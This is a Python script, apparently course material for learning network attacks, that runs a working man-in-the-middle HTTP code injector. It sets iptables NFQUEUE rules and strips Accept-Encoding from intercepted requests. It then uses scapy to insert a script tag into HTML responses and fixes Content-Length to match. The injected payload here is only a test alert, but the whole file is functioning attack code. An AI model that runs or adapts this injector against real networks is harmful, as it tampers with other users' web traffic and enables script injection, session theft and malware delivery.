#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re
import subprocess


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet.haslayer(scapy.TCP) and scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)                              # Replace the attribute that tells the server that our browser understands x encoding languages, we make it empty to force the server to send the response in plain text without encoding

        elif scapy_packet.haslayer(scapy.TCP) and scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injected_payload = "<script>alert('TEST');</script>"
            load = load.replace(b"</body>", injected_payload.encode() + b"</body>")             # OR we can use --> modified_load = re.sub(b"</body>", b"<script>alert('NOTE');</script></body>", scapy_packet[scapy.Raw].load)
            content_length_search = re.search(b"(?:Content-Length:\s)(\d*)", load)
            if content_length_search and b"text/html" in load:
                content_length = content_length_search.group(1).decode()
                new_content_length = int(content_length) + len(injected_payload)
                load = load.replace(content_length.encode(), str(new_content_length).encode())

        if load != scapy_packet[scapy.Raw].load:                              # Means that the load has changed from the original one so we need to modify the entire packet
            new_packet = set_load(scapy_packet, load)                         # This will give me a new packet that is identical to the scapy packet but with the modified load
            packet.set_payload(bytes(new_packet))                             # since we modified the packet we need to tell python that this is your packet after modifying it
    packet.accept()


try:
    print("Formatting iptables rules...")
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("\nResetting iptables rules to original...")
    subprocess.call("iptables --flush", shell=True)
    print("Exiting...")
